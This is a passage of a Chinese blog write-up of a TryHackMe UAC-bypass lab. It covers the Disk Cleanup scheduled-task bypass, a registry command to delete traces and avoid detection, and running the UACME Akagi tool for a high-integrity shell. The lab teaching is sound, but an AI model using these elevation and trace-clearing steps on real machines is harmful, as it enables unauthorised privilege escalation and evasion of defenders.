   - 这是 `schtasks` 命令的一个选项，代表 "Interactively"，即交互式运行任务。使用这个选项时，任务会以交互模式运行，即使它原本被设置为非交互模式。对于某些任务，这可能意味着会弹出窗口或对话框，但对于 `SilentCleanup` 任务来说，即使使用了 `/<span class="hljs-selector-tag">I</span>` 选项，它应该仍然在没有用户交互的情况下运行，因为它的名字暗示了 "silent"（静默）执行。

综上所述，这个命令的作用是立即以静默模式运行 Windows 磁盘清理任务，无需用户交互，自动执行清理操作。这可以用于脚本或自动化任务，以保持系统清洁和释放磁盘空间。</code></pre>
<p>因此，您应该获得具有高 IL 的 shell：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543688.png" alt></p>
<p>要检索 DiskCleanup 标志，请使用新 shell 执行：</p>
<pre><code class="hljs scss">C:\flags\GetFlag-diskcleanup.exe</code></pre>
<p><strong>注意：请记住，仅当您通过 diskcleanup 成功绕过UAC时才会返回该标志，并且仅通过 socat 从生成的高完整性 shell 中返回该标志。</strong></p>
<h2 id="清理痕迹">清理痕迹</h2>
<p>执行此漏洞的结果是，在目标系统上创建了一些工件，例如注册表项。为了避免检测到，我们需要使用以下命令进行清理：</p>
<pre><code class="hljs scss">reg delete "HKCU\Environment" /v "windir" /f</code></pre>
<p>**注意：请务必执行给定的命令，以避免任何人为因素干扰以下任务。由于许多 Windows 组件依赖于 %windir% 环境变量，因此在删除用于此绕过的注册表项之前，*<strong>很多功能都无法</strong>正常工作。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543689.png" alt></p>
<h1 id="0x07-自动利用">0x07 自动利用</h1>
<h2 id="自动绕过uac">自动绕过UAC</h2>
<p>有一个出色的工具可用于测试UAC绕过，而无需从头开始编写漏洞利用程序。 UACME 由 @hfiref0x 创建，提供了可以开箱即用的UAC绕过技术的最新存储库。该工具可从其官方存储库下载：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
<p>虽然 UACME 提供了多种工具，但我们将主要关注名为 Akagi 的工具，它运行实际的UAC旁路。您可以在<code>C:\tools\UACME-Akagi64.exe</code>下找到 Akagi 的编译版本。</p>
<p>使用该工具非常简单，只需要您指明与要测试的方法相对应的编号。项目的 GitHub 描述中提供了完整的方法列表。如果你想测试方法33，你可以从命令提示符执行以下操作，然后会弹出一个高完整性cmd.exe：</p>
<pre><code class="hljs scss">Microsoft Windows <span class="hljs-selector-attr">[Version 10.0.17763.1821]</span>
(c) <span class="hljs-number">2018</span> Microsoft Corporation. <span class="hljs-attribute">All</span> rights reserved.

C:\Users\attacker&gt;cd /tools

C:\tools&gt;UACME-Akagi64.exe <span class="hljs-number">33</span></code></pre>
<p>通过本房间介绍的方法也可以通过UACME使用以下方法进行测试：</p>
<table>
<thead>
<tr>
<th>方法编号</th>
<th>旁路技术</th>
</tr>
</thead>
<tbody>
<tr>
<td>33</td>
<td>fodhelper.exe</td>
</tr>
<tr>
<td>34</td>
<td>磁盘清理计划任务</td>
</tr>
<tr>
<td>70</td>
<td>使用 CurVer 注册表项的 fodhelper.exe</td>
</tr>
</tbody>
</table>
<h1 id="0x08-结论">0x08 结论</h1>
<p>我们在这个房间中展示了几种在 Windows 系统中绕过 UAC 的方法。虽然大多数这些方法都具有关联的自动工具，但如果直接开箱即用，它们将很容易被市场上的任何AV解决方案检测到。了解实际的方法将使您作为攻击者获得优势，因为您可以根据需要自定义攻击并使其更加难以规避。</p>
<p>As we have seen, UAC isn’t considered a security boundary and is therefore prone to several bypass methods.<br>
正如我们所看到的，UAC 不被视为安全边界，因此容易出现多种绕过方法。</p>
<p>Should you be interested in learning more techniques, the following resources are available:<br>
如果您有兴趣学习更多技术，可以使用以下资源：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME github repository&nbsp;UACME github 存储库</a></li>
<li><a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/">使用模拟文件夹和DLL劫持绕过UAC</a><a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/"></a></li>
<li><a target="_blank" rel="noopener" href="https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/">UAC绕过技术检测策略</a>&nbsp;– 已失效</li>
<li><a target="_blank" rel="noopener" href="https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html">阅读有关UAC 的方法</a></li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/08/08/thm-bypass-uac/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/08/08/thm-bypass-uac/')">THM-ByPass_UAC</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/08/08/thm-bypass-uac/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-ByPass_UAC&amp;url=http://hybcx.xyz/2024/08/08/thm-bypass-uac/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/07/thm-qian-ming-gui-bi/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-签名规避</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-运行时规避检测</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/06/16/thm-hacking-with-powershell/" title="THM-Hacking_With_PowerShell"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-16</div><div class="title">THM-Hacking_With_PowerShell</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%BF%E9%97%B4%E7%9B%AE%E6%A0%87"><span class="toc-number">1.1.</span> <span class="toc-text">房间目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%BF%E9%97%B4%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">房间先决条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-uac"><span class="toc-number">2.</span> <span class="toc-text">0x02 UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFuac"><span class="toc-number">2.1.</span> <span class="toc-text">什么是UAC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uac-%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">UAC 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%80%A7%E7%BA%A7%E5%88%AB"><span class="toc-number">2.3.</span> <span class="toc-text">完整性级别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E7%9A%84%E4%BB%A4%E7%89%8C"><span class="toc-number">2.4.</span> <span class="toc-text">过滤后的令牌</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E5%B8%B8%E8%A7%84%E7%9A%84%E6%96%B9%E5%BC%8F%E6%89%93%E5%BC%80%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.5.</span> <span class="toc-text">用常规的方式打开应用程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uac-%E8%AE%BE%E7%BD%AE"><span class="toc-number">2.6.</span> <span class="toc-text">UAC 设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uac-%E5%86%85%E9%83%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">2.7.</span> <span class="toc-text">UAC 内部机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-uac"><span class="toc-number">2.8.</span> <span class="toc-text">ByPass UAC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%9F%BA%E4%BA%8Egui%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">0x03 基于GUI的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6msconfig"><span class="toc-number">3.1.</span> <span class="toc-text">案例研究：msconfig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6azmanmsc"><span class="toc-number">3.2.</span> <span class="toc-text">案例研究：azman.msc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-uac-%E8%87%AA%E5%8A%A8%E6%8F%90%E5%8D%87%E8%BF%9B%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">0x04 UAC: 自动提升进程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%8F%90%E5%8D%87"><span class="toc-number">4.1.</span> <span class="toc-text">自动提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6fodhelper"><span class="toc-number">4.2.</span> <span class="toc-text">案例研究：Fodhelper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%8A%E5%AE%83%E4%BB%AC%E6%94%BE%E5%9C%A8%E4%B8%80%E8%B5%B7"><span class="toc-number">4.3.</span> <span class="toc-text">把它们放在一起</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9"><span class="toc-number">4.4.</span> <span class="toc-text">清理痕迹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-uac-%E6%94%B9%E8%BF%9Bfodhelper%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87windefender"><span class="toc-number">5.</span> <span class="toc-text">0x05 UAC: 改进Fodhelper漏洞绕过WinDefender</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-defender"><span class="toc-number">5.1.</span> <span class="toc-text">Windows Defender</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B-fodhelper-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.2.</span> <span class="toc-text">改进 fodhelper 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9"><span class="toc-number">5.3.</span> <span class="toc-text">清理痕迹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-uac-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8B%93%E5%B1%95"><span class="toc-number">6.</span> <span class="toc-text">0x06 UAC: 环境变量拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-always-notify"><span class="toc-number">6.1.</span> <span class="toc-text">绕过 Always Notify</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6%E7%A3%81%E7%9B%98%E6%B8%85%E7%90%86%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">6.2.</span> <span class="toc-text">案例研究：磁盘清理计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%8A%E5%AE%83%E4%BB%AC%E6%94%BE%E5%9C%A8%E4%B8%80%E8%B5%B7"><span class="toc-number">6.3.</span> <span class="toc-text">把它们放在一起</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9"><span class="toc-number">6.4.</span> <span class="toc-text">清理痕迹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E8%87%AA%E5%8A%A8%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">0x07 自动利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E7%BB%95%E8%BF%87uac"><span class="toc-number">7.1.</span> <span class="toc-text">自动绕过UAC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E7%BB%93%E8%AE%BA"><span class="toc-number">8.</span> <span class="toc-text">0x08 结论</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a 